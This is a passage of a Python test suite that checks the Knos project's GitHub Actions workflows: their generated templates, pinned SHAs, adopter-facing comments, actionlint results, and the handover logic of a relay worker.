    assert front.main(["--check"]) == 1 and "old ${x}" in page.read_text(encoding="utf-8")          # --check writes nothing
    assert front.main([]) == 0 and front.main(["--check"]) == 0
    js = page.read_text(encoding="utf-8")

    def evaluated(name: str) -> str:
        body = re.search(r"export const " + name + r" = `(.*?)`;\n", js, re.DOTALL).group(1)
        assert not re.search(r"(?<!\\)(?:\\\\)*\$\{", body) and not re.search(r"(?<!\\)(?:\\\\)*`", body), "something JavaScript would evaluate"
        return re.sub(r"\\(.)", r"\1", body, flags=re.DOTALL)
    assert evaluated("WORKFLOW") == (EXAMPLES / "knos-workflow.yml").read_text(encoding="utf-8")
    assert evaluated("CHECK_WORKFLOW") == (EXAMPLES / "knos-check.yml").read_text(encoding="utf-8")
    pin = front.pin([(EXAMPLES / n).read_text(encoding="utf-8") for n in OWN])
    assert (pin == PLACEHOLDER or re.fullmatch(SHA, pin)) and f'export const KNOS_WORKFLOWS_SHA = "{pin}";' in js
    assert "const kept = 1;" in js and "export function f() {}" in js
    page.write_text("export const WORKFLOW = `x`;\n", encoding="utf-8")
    with pytest.raises(SystemExit):
        front.main(["--check"])                                                  # a page that lost a template is said, not passed


# ---- Knos's own key workflow --------------------------------------------------------------------------------------------

def test_the_key_workflow_calls_the_pinned_rotate_workflow_on_the_events_the_second_deployment_accepts():
    doc = _doc(WF / "keys.yml")
    [job] = doc["jobs"].values()
    pins = (ROOT / "programs-v2" / "knos_oidc" / "src" / "pins.rs").read_text(encoding="utf-8")
    sha = re.search(r'pub const ROTATE_SHA: &\[u8; 40\] = b"([0-9a-f]{40})";', pins).group(1)
    assert job["uses"] == f"{ROTATE}rotate.yml@{sha}" and set(job) == {"permissions", "uses"}
    assert sha == re.search(r'pub const ROTATE_SHA: &\[u8; 40\] = b"([0-9a-f]{40})";',
                            (ROOT / "programs" / "knos_oidc" / "src" / "pins.rs").read_text(encoding="utf-8")).group(1)
    # the second deployment takes a key token only from a scheduled run or one started by hand
    events = set(re.findall(r'b"(\w+)"', re.search(r"pub const ATTEST_EVENTS.*", pins).group(0)))
    assert set(doc["on"]) == events == {"schedule", "workflow_dispatch"}


# ---- what the comments must go on saying ---------------------------------------------------------------------------------

def test_the_files_an_adopter_reads_say_what_each_trigger_does_what_they_can_touch_and_why_they_are_safe():
    banned = re.compile(r"\bimmutable\b|nobody can change", re.I)       # never said of the second deployment
    for example in ("knos-workflow.yml", "knos-check.yml", "knos-claim.yml", "knos-attest.yml"):
        doc, text = _doc(EXAMPLES / example), (EXAMPLES / example).read_text(encoding="utf-8")
        head = text.split("\nname:")[0]
        assert all(ln.startswith("#") for ln in head.splitlines()), f"{example} opens with what an adopter reads"
        said = _comments(EXAMPLES / example)
        for trigger in doc["on"]:
            assert f"(`{trigger}`)" in head, f"{example} does not say what `{trigger}` does"
        assert re.search(r"needs no secret|No secret is needed", said), example
        assert "What it can do in this repository" in said and "What it cannot do" in said, example
        assert not banned.search(text), (example, banned.search(text).group(0))
    said = _comments(EXAMPLES / "knos-workflow.yml")
    assert "It does not use `pull_request_target`" in said and "No job that can ask for a signed statement checks out or runs anything from a pull request" in said
    assert "as it is at the pushed commit" in said and "workflow's own token starts no run" in said and "[skip ci]" in said
    assert "test USDC" in said and "never the pull request's" in said and "KNOS_RELAY_KEY" in said
    assert "first-time contributor" in _comments(EXAMPLES / "knos-check.yml") and "advice" in _comments(EXAMPLES / "knos-check.yml")
    claim = _comments(EXAMPLES / "knos-claim.yml")
    assert "by hand only" in claim and "an address that arrives in a link could be someone else's" in claim.lower()
    for name in REUSABLE:
        said, text = _comments(WF / name), (WF / name).read_text(encoding="utf-8")
        assert "sees the caller's event" in said and "takes no inputs" in said and not banned.search(text), name
    prove = _comments(WF / "prove.yml")
    assert "A push made with a workflow's own token (GITHUB_TOKEN) starts no run at all" in prove
    assert "none of its artifacts, outputs or logs is read" in prove and "`workflow_run.pull_requests` is empty" in prove


# ---- actionlint -------------------------------------------------------------------------------------------------------

# Two keys GitHub's workflow syntax has that actionlint 1.7.12 does not know yet: `queue` in a concurrency group
# (every waiting run keeps its turn) and a job's `cache-mode` (what it may do with the Actions cache).
NEWER_SYNTAX = ('unexpected key "queue" for "concurrency" section', 'unexpected key "cache-mode" for "job" section')


def test_actionlint_passes_on_every_workflow():
    exe = os.environ.get("ACTIONLINT") or shutil.which("actionlint")
    if exe and Path(exe).is_dir():
        exe = str(Path(exe) / "actionlint")
    if not exe or not Path(exe).is_file():
        pytest.skip("actionlint is not installed (put it on PATH, or name it in ACTIONLINT)")
    ignore = [arg for message in NEWER_SYNTAX for arg in ("-ignore", message)]
    files = [str(p.relative_to(ROOT)) for p in _files()]
    got = subprocess.run([exe, "-no-color", "-shellcheck=", "-pyflakes=", *ignore, *files], cwd=str(ROOT), capture_output=True, text=True, check=False)
    assert got.returncode == 0, got.stdout + got.stderr
    # and the two exceptions are still needed, by Knos's files and only for those keys
    bare = subprocess.run([exe, "-no-color", "-shellcheck=", "-pyflakes=", *files], cwd=str(ROOT), capture_output=True, text=True, check=False)
    complaints = [ln for ln in bare.stdout.splitlines() if re.match(r"\S+:\d+:\d+: ", ln)]
    assert all(any(m in ln for m in NEWER_SYNTAX) and ln.split(":")[0].endswith(PUBLISHED) for ln in complaints), complaints


# ---- the always-on worker: the next run takes over before this one stops ----------------------------------------------------

def test_the_next_worker_run_takes_over_before_this_one_stops_and_the_timer_starts_no_second_chain(tmp_path):
    """The relay was down 12 to 22 s between two runs (the next one waited in line behind this one, then installed), and
    a token posted then waited that long. Each run now starts the next 30 s before it stops, with no line to hold it,
    so the next one has installed by then; and a run the timer or a person starts goes on only when none is going."""
    doc = _doc(WF / "worker.yml")
    assert "concurrency" not in doc and "concurrency" not in doc["jobs"]["relay"]
    assert set(doc["on"]["workflow_dispatch"]["inputs"]) == {"after"} and doc["on"]["schedule"] == [{"cron": "*/5 * * * *"}]
    steps, gate = _steps(doc["jobs"]["relay"]), "steps.chain.outputs.go == 'true'"
    guard = steps[0]
    assert guard["id"] == "chain" and guard["env"]["AFTER"] == "${{ inputs.after }}"
    # the last step also runs after a step that failed (always()), but it starts the next run only when THIS run relayed:
    # a run whose relay failed, or relayed nothing, would otherwise start run after run that cannot relay either
    last = f"always() && {gate} && steps.relay.outcome == 'success' && steps.relay.outputs.relayed == 'true'"
    assert [s.get("if") for s in steps[1:-1]] == [gate] * (len(steps) - 2) and steps[-1]["if"] == last

    def starts_next(go: str = "true", outcome: str = "success", relayed: str = "true", status: str = "success") -> bool:
        context = {"steps": {"chain": {"outputs": {"go": go}}, "relay": {"outcome": outcome, "outputs": {"relayed": relayed} if relayed else {}}}}
        return bool(value(steps[-1]["if"], context, status))
    assert starts_next() and starts_next(status="failure")            # also when the hand-over step after the relay failed
    assert not starts_next(outcome="failure", relayed="", status="failure")      # a failed relay starts no next run
    assert not starts_next(relayed="")                                # it ended well but relayed nothing (no key): none either
    assert not starts_next(outcome="skipped", relayed="") and not starts_next(go="false")
    [relay] = [s for s in steps if s.get("id") == "relay"]
    lines = relay["run"].strip().splitlines()
    assert "knos relay --serve" in relay["run"] and lines[-1] == 'echo "relayed=true" >> "$GITHUB_OUTPUT"'      # said only once the relay ended well
    assert lines.index(lines[-1]) > max(n for n, ln in enumerate(lines) if "knos relay --serve" in ln or "exit 1" in ln or "exit 0" in ln)
    serves = [s["run"] for s in steps if "knos relay --serve" in s.get("run", "")]
    assert len(serves) == 2 and all(s.count("knos relay --serve") == 1 for s in serves)
    first, tail = (int(re.search(r"--serve (\d+)", s).group(1)) for s in serves)
    assert 20 <= tail <= 45 and 240 <= first + tail <= 300   # time for the next run to install (10 to 21 s were seen), and a short overlap
    handover = serves[1]
    assert "gh workflow run" not in serves[0] and "sleep" not in handover and "&" not in handover.replace("&&", "")
    assert handover.count('-f after="$GITHUB_RUN_ID"') == 1 and '&& touch "$RUNNER_TEMP/knos-next"' in handover
    assert handover.index("gh workflow run worker.yml ") < handover.index("knos relay --serve")     # started first, then relayed on
    assert steps[-1]["run"].startswith('[ -f "$RUNNER_TEMP/knos-next" ] || gh workflow run worker.yml ') and '-f after="$GITHUB_RUN_ID"' in steps[-1]["run"]
    go = _chain_step(tmp_path, guard["run"])
    went = go("")
    assert went[0] == "go=true" and "run list" in went[1] and "--workflow worker.yml" in went[1]     # the timer, with no run going
    assert go("", [_run(70, "relay after 69")])[0] == "go=false"     # the timer while the chain runs: that chain goes on alone
    assert go("", fail="1")[0] == "go=false"                          # GitHub did not list the runs: the next tick asks again


def _run(n: int, title: str, status: str = "in_progress") -> dict:
    return {"databaseId": n, "status": status, "displayTitle": title}


def _chain_step(tmp_path, script: str):
    """The worker's first step, run by bash against a fake `gh` that lists `runs` (this run, 80 unless `me` says
    otherwise, is listed too)."""
    bash, jq = shutil.which("bash"), shutil.which("jq")
    if not bash or not jq or os.name == "nt":
        pytest.skip("the first step's script is bash, and reads GitHub's answer with jq")
    fake = tmp_path / "bin"
    fake.mkdir(exist_ok=True)
    (fake / "gh").write_text('#!/bin/sh\necho "$*" >> "$CALLS"\n[ -n "$FAIL" ] && exit 1\nprintf "%s" "$RUNS"\n', encoding="utf-8")
    (fake / "gh").chmod(0o755)

    def go(after: str, runs: list[dict] = (), fail: str = "", attempt: str = "1", me: int = 80) -> tuple[str, str]:
        out, calls = tmp_path / "out", tmp_path / "calls"
        out.write_text("", encoding="utf-8")
        calls.write_text("", encoding="utf-8")
        listed = [_run(me, f"relay after {after}" if after else "relay"), *runs]
        env = {**os.environ, "PATH": f"{fake}{os.pathsep}{os.environ['PATH']}", "AFTER": after, "RUNS": json.dumps(listed), "FAIL": fail,
               "CALLS": str(calls), "GITHUB_OUTPUT": str(out), "GITHUB_RUN_ID": str(me), "GITHUB_RUN_ATTEMPT": attempt, "GITHUB_REPOSITORY": "o/r"}
        subprocess.run([bash, "-e", "-c", script], env=env, check=True, capture_output=True)
        return out.read_text(encoding="utf-8").strip(), calls.read_text(encoding="utf-8")
    return go


def test_a_worker_run_takes_over_only_as_the_one_successor_and_a_second_chain_ends_at_its_next_handover(tmp_path):
    """No concurrency group merges two chains of runs any more, so the first step does: a run started with `after` goes
    on only as the first run to take over from that run, and only while no run of another chain relays without having
    handed over. Two ways a second chain began: a re-run of a chain run (it keeps its `after`) and a start GitHub took
    but answered with an error (the last step asked again)."""
    doc = _doc(WF / "worker.yml")
    name = doc["run-name"][3:-2].strip()       # each run's title names the run it takes over from: the first step reads it
    assert value(name, {**_event("workflow_dispatch", {}), "inputs": {"after": "76"}}) == "relay after 76"
    assert value(name, _event("schedule", {})) == "relay" and value(name, _event("workflow_dispatch", {})) == "relay"
    go = _chain_step(tmp_path, _steps(doc["jobs"]["relay"])[0]["run"])
    # the chain as it should be: the run before still relays for a few seconds, cron runs come and go
    assert go("76", [_run(76, "relay after 75"), _run(75, "relay after 74", "completed"), _run(79, "relay")])[0] == "go=true"
    assert "run list" in go("76")[1]
    # GitHub did not list the runs: a run taken over relays all the same, and the next handover asks again
    assert go("76", fail="1")[0] == "go=true"
    # a re-run of a chain run: it neither relays nor starts a run (its first attempt started the next one), asking nothing
    assert go("76", [_run(81, "relay after 80")], attempt="2") == ("go=false", "")
    assert go("", attempt="2") == ("go=false", "")
    # the start that GitHub took but answered with an error: the second run to take over from 76 ends, the first goes on
    twins = [_run(76, "relay after 75"), _run(78, "relay after 76"), _run(80, "relay after 76")]
    assert go("76", [r for r in twins if r["databaseId"] != 80], me=80)[0] == "go=false"
    assert go("76", [r for r in twins if r["databaseId"] != 78], me=78)[0] == "go=true"
    # two chains: X (76 -> 80) and Y (77 relays). X's next run finds Y relaying and ends there; Y's next run (82), once
    # X's last run (80) has ended, goes on alone.
    assert go("76", [_run(76, "relay after 70"), _run(77, "relay after 72")])[0] == "go=false"
    assert go("77", [_run(77, "relay after 72"), _run(76, "relay after 70", "completed"), _run(80, "relay after 76", "completed")], me=82)[0] == "go=true"
    # a run of the other chain that has handed over (77 -> 79) is ending and does not stop this one, but the run it handed
    # over to does while it relays; a newer one (81) decides for itself
    assert go("76", [_run(76, "relay after 70"), _run(77, "relay after 72"), _run(79, "relay after 77", "completed")])[0] == "go=true"
    assert go("76", [_run(76, "relay after 70"), _run(77, "relay after 72"), _run(79, "relay after 77")])[0] == "go=false"
    assert go("76", [_run(76, "relay after 70"), _run(81, "relay after 77")])[0] == "go=true"
    # a junk `after` (typed by hand) is a start by hand: it goes only when no run is going
    assert go("x1", [_run(76, "relay after 75")])[0] == "go=false"


def test_a_worker_run_saves_its_notes_before_it_starts_the_next_run():
    """The next run restores the newest notes saved. Saved only when a run ended, they were those of the run before the
    one handing over, and the relay's notes split into two lines of runs (each with its own day's counts, unposted
    lines and tries). So a run saves them, then starts the next run, then relays on while that one installs."""
    steps = _steps(_doc(WF / "worker.yml")["jobs"]["relay"])
    uses = [str(s.get("uses", "")).split("@")[0] for s in steps]
    assert "actions/cache" not in uses       # it saves only when the job ends: after the next run restored
    restore, save = uses.index("actions/cache/restore"), uses.index("actions/cache/save")
    serve = [i for i, s in enumerate(steps) if "knos relay --serve" in s.get("run", "")]
    start = [i for i, s in enumerate(steps) if "gh workflow run worker.yml" in s.get("run", "")]
    assert restore < serve[0] < save < start[0] == serve[1] and start[-1] == len(steps) - 1
    key = "knos-relay-home-${{ github.run_id }}"
    assert steps[restore]["with"] == {"path": ".knos-home", "key": key, "restore-keys": "knos-relay-home-"}
    assert steps[save]["with"] == {"path": ".knos-home", "key": key}
